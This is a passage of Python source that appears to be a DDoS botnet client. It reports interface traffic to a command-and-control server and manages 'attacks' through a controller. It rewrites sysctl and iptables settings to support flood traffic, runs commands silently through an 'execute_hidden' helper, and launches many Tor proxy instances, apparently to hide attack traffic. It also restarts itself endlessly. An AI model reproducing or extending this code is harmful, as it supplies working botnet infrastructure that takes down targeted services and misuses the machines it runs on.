			self.info['os']	= None
	
	def	get(self, value='all'):
		if value == 'all':
			return self.info
		else:
			return self.info[value]

netstat	= {}
async def watchdog(self):
	old_stat = {}
	new_stat = {}
 
	def	parse_netstat():
		with open('/proc/net/dev', 'r')	as f:
			while not stop:
				stat = f.readline().split()
				if not stat: break
				if not stat[0].endswith(':'): continue
				iface =	stat[0]
				stat = list(map(int, stat[1:]))
				new_stat[iface]	= {
					'rx': stat[:4], 'tx': stat[8:12] }
	while not stop:
		parse_netstat()

		if old_stat:
			for iface, data in new_stat.items():
				tmp = {}
				for direction in data:
					tmp[direction] = list(map(int.__sub__, new_stat[iface][direction], old_stat.get(iface, {}).get(direction, [])))
					# converting kbytes to mbits
					tmp[direction][0] = int((tmp[direction][0]/1000)/125)
				netstat[iface] = tmp
	
			if self.cnc_reactor and self.cnc_reactor.connected:
				self.writer.write(
					self.cnc_reactor.send_response(
						packet_id = 11, 
	 					packet_data	= {'netstat': json.dumps(netstat)}))
		old_stat = new_stat.copy()

		with os.popen('free -t -m') as pipe:
			free_ram = int(list(map(int, pipe.readlines()[1].split()[1:]))[-1])

			if free_ram < 1024:
				controller.manage_attacks(stop_all=True)
				os.system('echo BOT_DETECTED_OOM > /dev/kmsg')

				if self.cnc_reactor and self.cnc_reactor.connected:
					self.writer.write(
						self.cnc_reactor.send_response(
							packet_id = 12, 
	 						packet_data	= {'message': 'BOT_DETECTED_OOM'}))
	 
		await asyncio.sleep(1)

def	fix_sysctl():
	sysctl = open('/etc/sysctl.conf', 'a')
	sysctl_conf	= open('/etc/sysctl.conf', 'r').read()
	if sysctl_confs	not	in sysctl_conf:
		sysctl.write(sysctl_confs)
		sysctl.close()
		os.system('sysctl -p')
		os.system('echo	30 > /proc/sys/net/ipv4/tcp_fin_timeout')
		os.system('echo	1 >	/proc/sys/net/ipv4/tcp_tw_reuse')
		print('[MAIN] Fixed	sysctl')
		os.system('iptables	-t raw -I PREROUTING -p tcp	-j NOTRACK')

def	execute_result(command):
	proc = subprocess.Popen(command.split(" "),	stdout=subprocess.PIPE,	stderr=subprocess.DEVNULL)
	try:
		return proc.communicate()[0].decode()
	except:
		return None

def	execute_hidden(command):
	os.system(command + ' >/dev/null 2>&1')

from asyncio.subprocess import PIPE, STDOUT
async def start_nodes(port_range):
	main_dir = '/etc/tor'
	os.system(f"chmod 700 {main_dir}")
	os.system(f'rm -rf {main_dir}/tor-*/')
	os.system("pkill tor")

	for	port in port_range:
		i = port
		template = f'''
			MaxClientCircuitsPending 128
			CircuitBuildTimeout	180
			SocksPort {port}
			DataDirectory {main_dir}/tor-{i}
			HardwareAccel 1
			AvoidDiskWrites	1
			CircuitStreamTimeout 180
			SocksTimeout 180
			MaxCircuitDirtiness 65535
			NewCircuitPeriod 65535
			EnforceDistinctSubnets 0'''
		try: os.makedirs(f'{main_dir}/tor-{i}')
		except: pass
		with open(f'{main_dir}/tor-{i}/{i}.conf', 'w') as cnf:
			cnf.write(template)

		cmd	= f"tor -f {main_dir}/tor-{i}/{i}.conf"
		print('\n[>]', cmd)
		tor_process = await asyncio.create_subprocess_exec(
				*cmd.split(), stdout=PIPE, stderr=STDOUT)
		
		for _ in range(300): # attempts
			try:
				line = await asyncio.wait_for(tor_process.stdout.readline(), timeout=30)
			except asyncio.TimeoutError:
				tor_process.kill()
				tor_process = await asyncio.create_subprocess_exec(
					*cmd.split(), stdout=PIPE, stderr=STDOUT)
			else:
				print(line)
				if not line: # EOF
					status = 'died'
				elif b'100%' in line:
					status = 'ok'
					os.system(f'mkdir {main_dir}/tor-{i+1}')
					os.system(f'cp -r {main_dir}/tor-{i}/cached-microdesc-consensus {main_dir}/tor-{i+1}')
					os.system(f'cp -r {main_dir}/tor-{i}/cached-microdescs {main_dir}/tor-{i+1}')
					os.system(f'cp -r {main_dir}/tor-{i}/cached-certs {main_dir}/tor-{i+1}')
					os.system(f'cp -r {main_dir}/tor-{i}/state {main_dir}/tor-{i+1}')
					os.system(f'cp -r {main_dir}/tor-{i}/keys {main_dir}/tor-{i+1}')
					break
				else:
					status = 'fail'
		print('tor_status:', status)

def	init():
		
	execute_hidden(f"apt install -y tor	p7zip-full")

sysctl_confs = '''
net.netfilter.nf_conntrack_max=5242880
net.netfilter.nf_conntrack_tcp_timeout_syn_sent	= 3
net.netfilter.nf_conntrack_tcp_timeout_syn_recv	= 3
net.ipv4.tcp_synack_retries=1
net.ipv4.tcp_max_orphans=600000
net.ipv4.tcp_max_syn_backlog=16384
net.ipv4.route.flush=1
net.ipv4.tcp_no_metrics_save = 1
net.ipv4.ip_local_port_range = 1024	65535
net.ipv4.netfilter.ip_conntrack_tcp_timeout_time_wait =	15
'''
os.system('ulimit -n 256000')
fix_sysctl()
init()

controller = Controller()

def	main():
	try:
		asyncio.run(controller.network_loop())
	except:
		controller.manage_attacks(True)
		if DEBUG: raise

while 1: main()